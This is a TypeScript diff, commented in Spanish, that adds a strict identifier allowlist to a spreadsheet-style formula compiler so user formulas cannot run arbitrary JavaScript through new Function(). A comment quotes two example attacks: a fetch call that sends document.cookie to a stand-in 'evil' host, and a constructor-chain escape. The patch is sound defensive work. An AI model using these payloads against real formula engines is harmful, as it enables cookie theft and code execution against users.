@@ -143,6 +143,80 @@ function normalizeComparisonOperators(expression: string): string {
     .join('');
 }
 
+/**
+ * Identificadores que pueden aparecer legítimamente en `resolved` una vez
+ * aplicadas TODAS las sustituciones: los helpers internos, los getters de
+ * columna y los literales que generan los alias TRUE/FALSE/NULL/NAN.
+ * Cualquier otro identificador es texto del usuario que el filtro de alias
+ * (solo ALL-CAPS) dejó pasar sin tocar -- ver findDisallowedIdentifier.
+ */
+const SAFE_RESOLVED_IDENTIFIERS = new Set<string>([
+  ...FORMULA_HELPER_NAMES,
+  '__GET',
+  '__GET_TOTAL',
+  'true',
+  'false',
+  'null',
+  'NaN',
+]);
+
+function isIdentifierStart(ch: string): boolean {
+  return /[A-Za-z_$]/.test(ch);
+}
+
+function isIdentifierPart(ch: string): boolean {
+  return /[A-Za-z0-9_$]/.test(ch);
+}
+
+/**
+ * Recorre `resolved` (ya con todas las sustituciones de {{Columna}} y alias
+ * ALL-CAPS aplicadas) fuera de literales de string ('...'/"...") y devuelve
+ * el primer identificador que NO está en la allowlist estricta, o null si
+ * todo es seguro.
+ *
+ * Esto es lo que de verdad impide que new Function() ejecute código
+ * arbitrario: FUNCTION_ALIAS_REGEX solo traduce nombres ALL-CAPS conocidos
+ * (IF, OR, ...) y deja pasar intacto cualquier otro identificador -- una
+ * fórmula como `(1, fetch('https://evil/steal?c='+document.cookie))` no
+ * contiene ninguna palabra en mayúsculas, así que compilaba sin error y
+ * ejecutaba con acceso real a document/window/fetch, porque new Function()
+ * NO aísla del scope global del navegador (solo controla los parámetros
+ * nombrados explícitos). Lo mismo aplica a fugas por cadena de prototipos
+ * (ej. `total.constructor.constructor('...')()`, donde `total` es el
+ * parámetro real de la función compilada) -- por eso se exige allowlist
+ * ESTRICTA (blanquear lo conocido, rechazar todo lo demás) en vez de
+ * bloquear una lista de palabras peligrosas. Hallazgo de seguridad
+ * 2026-09-29.
+ */
+function findDisallowedIdentifier(resolved: string): string | null {
+  let i = 0;
+  const n = resolved.length;
+  while (i < n) {
+    const ch = resolved[i];
+    if (ch === '"' || ch === "'") {
+      const quote = ch;
+      i += 1;
+      while (i < n && resolved[i] !== quote) {
+        i += resolved[i] === '\\' && i + 1 < n ? 2 : 1;
+      }
+      i += 1; // salta la comilla de cierre (o el fin de string si quedó abierta)
+      continue;
+    }
+    if (isIdentifierStart(ch)) {
+      let j = i + 1;
+      while (j < n && isIdentifierPart(resolved[j])) j += 1;
+      const token = resolved.slice(i, j);
+      if (!SAFE_RESOLVED_IDENTIFIERS.has(token)) {
+        return token;
+      }
+      i = j;
+      continue;
+    }
+    i += 1;
+  }
+  return null;
+}
+
 function buildJsExpression(
   expression: string,
   columnKeys: string[],
@@ -198,6 +272,13 @@ function buildJsExpression(
     const placeholder = `${COLUMN_REF_PLACEHOLDER_PREFIX}${index}__`;
     resolved = resolved.split(placeholder).join(replacement);
   });
+
+  // 6. Bloqueo de seguridad: si queda cualquier identificador fuera de la
+  // allowlist estricta, se rechaza la fórmula entera en vez de dejarlo
+  // pasar a new Function() -- ver findDisallowedIdentifier.
+  if (findDisallowedIdentifier(resolved) !== null) {
+    return null;
+  }
 
   return resolved;
 }
